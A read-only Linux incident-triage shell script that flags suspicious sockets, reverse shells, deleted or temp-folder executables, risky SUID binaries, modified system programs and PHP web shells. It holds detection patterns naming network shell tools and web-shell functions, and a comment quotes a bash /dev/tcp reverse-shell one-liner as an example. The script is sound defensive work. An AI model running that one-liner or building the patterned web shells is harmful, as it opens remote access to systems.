#!/bin/sh
# hunt.sh - READ-ONLY live triage: what is running and talking on this box
# RIGHT NOW. Complements user_audit.sh / cron_audit.sh (which check what is
# configured); this checks what is actually executing.
#
# Usage:   sudo sh hunt.sh | tee "hunt_$(hostname)_$(date +%H%M).txt"
#          sudo RECENT_DAYS=1 sh hunt.sh
#          ansible linux -K -b -m script -a scripts/hunt.sh      (all boxes)
# Output:  [!] lines are leads, not proof. Changes NOTHING.
# Works on: Debian/Ubuntu, RHEL/Rocky/Fedora, Alpine (busybox). POSIX sh.

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export PATH
RECENT_DAYS=${RECENT_DAYS:-2}

flag()    { echo "[!] $*"; }
section() { printf '\n===== %s =====\n' "$1"; }
have()    { command -v "$1" >/dev/null 2>&1; }
cmdline() { tr '\0' ' ' < "/proc/$1/cmdline" 2>/dev/null | cut -c1-140; }

[ "$(id -u)" -eq 0 ] || echo "[warn] not root: other users' processes and sockets will be hidden"
echo "host: $(hostname)   date: $(date)   'recent' = last $RECENT_DAYS day(s)"

# Programs that should rarely own a network socket. A reverse shell is
# usually one of these holding a connection out to the attacker.
SHELLY_SS='"((ba|da|z|k|a)?sh|nc|ncat|netcat|socat|telnet|perl|ruby|lua|python[0-9.]*)"'
SHELLY_NETSTAT='/((ba|da|z|k|a)?sh|nc|ncat|netcat|socat|telnet|perl|ruby|lua|python[0-9.]*)[[:space:]]*$'

# ---------------------------------------------------------------------------
section "Listening ports (what is waiting for connections)"
if have ss; then
    ss -tulpn 2>/dev/null
elif have netstat; then
    netstat -tulpn 2>/dev/null
else
    echo "(no ss or netstat on this box)"
fi
echo "Compare with the scored services: anything you can't explain is a lead."

section "Live connections, flagging shells/interpreters holding a socket"
if have ss; then
    ss -tupn 2>/dev/null | while IFS= read -r l; do
        if printf '%s\n' "$l" | grep -qE "$SHELLY_SS"; then flag "$l"; else echo "$l"; fi
    done
elif have netstat; then
    netstat -tupn 2>/dev/null | while IFS= read -r l; do
        if printf '%s\n' "$l" | grep -qE "$SHELLY_NETSTAT"; then flag "$l"; else echo "$l"; fi
    done
else
    echo "(no ss or netstat on this box)"
fi
echo "(python/perl can be a legit web app - check what the process actually is)"

section "Processes whose INPUT is a network socket (reverse-shell signature)"
# 'bash -i >& /dev/tcp/IP/PORT 0>&1' wires the shell's stdin to the attacker's
# connection, whatever the program is renamed to. Daemons almost never do this.
# Only TCP/UDP sockets count (local unix sockets are normal, e.g. under ssh).
NET_INODES=$(awk 'NR > 1 {print $10}' /proc/net/tcp /proc/net/tcp6 /proc/net/udp /proc/net/udp6 2>/dev/null | sort -u)
found=0
for p in /proc/[0-9]*; do
    in0=$(readlink "$p/fd/0" 2>/dev/null) || continue
    case "$in0" in
        socket:*)
            ino=${in0#socket:[}; ino=${ino%]}
            printf '%s\n' "$NET_INODES" | grep -qx "$ino" || continue
            pid=${p#/proc/}
            exe=$(readlink "$p/exe" 2>/dev/null)
            flag "pid $pid  exe=$exe  stdin=$in0  cmd: $(cmdline "$pid")"; found=1 ;;
    esac
done
[ "$found" -eq 1 ] || echo "(none)"
echo "(match the socket number with: ss -tupne | grep <number>)"

# ---------------------------------------------------------------------------
section "Processes whose program file was deleted (dropper trick)"
found=0
for p in /proc/[0-9]*; do
    exe=$(readlink "$p/exe" 2>/dev/null) || continue
    case "$exe" in
        *" (deleted)")
            pid=${p#/proc/}
            flag "pid $pid  exe=$exe  cmd: $(cmdline "$pid")"; found=1 ;;
    esac
done
[ "$found" -eq 1 ] || echo "(none)"

section "Processes running from /tmp, /dev/shm, /var/tmp or a home folder"
found=0
for p in /proc/[0-9]*; do
    exe=$(readlink "$p/exe" 2>/dev/null) || continue
    case "$exe" in
        /tmp/*|/dev/shm/*|/var/tmp/*|/home/*|/root/*|/run/user/*)
            pid=${p#/proc/}
            flag "pid $pid  exe=$exe  user=$(stat -c %U "$p" 2>/dev/null)  cmd: $(cmdline "$pid")"; found=1 ;;
    esac
done
[ "$found" -eq 1 ] || echo "(none)"

# ---------------------------------------------------------------------------
section "SUID/SGID programs that hand out root"
# A copy of bash/python/find with SUID is an instant root shell (see GTFOBins).
RISKY='/(bash|sh|dash|zsh|ash|busybox|python[0-9.]*|perl|ruby|lua|php[0-9.]*|find|vim?|nano|less|more|awk|gawk|nmap|cp|mv|env|tar|zip|socat|nc|ncat|tee|dd|chmod|chown|node)$'
find / -xdev -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null | while read -r f; do
    case "$f" in
        /tmp/*|/var/tmp/*|/dev/shm/*|/home/*|/root/*|/var/www/*|/srv/*|/opt/*)
            flag "SUID/SGID in an odd place: $f"; continue ;;
    esac
    if printf '%s\n' "$f" | grep -qE "$RISKY"; then
        flag "SUID/SGID on a program that gives a shell: $f"
    fi
done
find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -mtime "-$RECENT_DAYS" 2>/dev/null | while read -r f; do
    flag "SUID/SGID file changed recently: $f   ($(ls -l "$f" | awk '{print $6, $7, $8}'))"
done
echo "(no [!] lines above = nothing odd)"

section "System programs modified recently (trojaned binaries)"
find /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -mtime "-$RECENT_DAYS" 2>/dev/null \
  | head -n 40 | while read -r f; do flag "$f   ($(ls -l "$f" | awk '{print $6, $7, $8}'))"; done
echo "(a package update also triggers this - check against apt/dnf/apk history)"

# ---------------------------------------------------------------------------
section "Web shells in web roots"
for d in /var/www /srv/www /srv/http /usr/share/nginx/html /var/lib/gitea/custom; do
    [ -d "$d" ] || continue
    echo "--- $d"
    find "$d" -type f \( -name '*.php' -o -name '*.phtml' -o -name '*.php[0-9]' -o -name '*.jsp' -o -name '*.cgi' -o -name '*.sh' -o -name '*.py' \) \
        -mtime "-$RECENT_DAYS" 2>/dev/null | while read -r f; do flag "recently changed script: $f"; done
    # code that runs whatever the web request sends = a web shell
    find "$d" -type f \( -name '*.php' -o -name '*.phtml' -o -name '*.php[0-9]' \) -exec \
        grep -lE '(eval|assert)[[:space:]]*\([[:space:]]*(base64_decode|gzinflate|str_rot13|\$_(GET|POST|REQUEST|COOKIE))|(system|shell_exec|passthru|exec|popen|proc_open)[[:space:]]*\([[:space:]]*\$_(GET|POST|REQUEST|COOKIE)' {} \; 2>/dev/null \
        | while read -r f; do flag "web shell pattern: $f"; done
done

section "Containers"
if have docker; then docker ps 2>/dev/null || echo "(docker present but not reachable)"; else echo "(no docker)"; fi

echo
echo "done. grep '^\[!\]' to see only flagged lines."
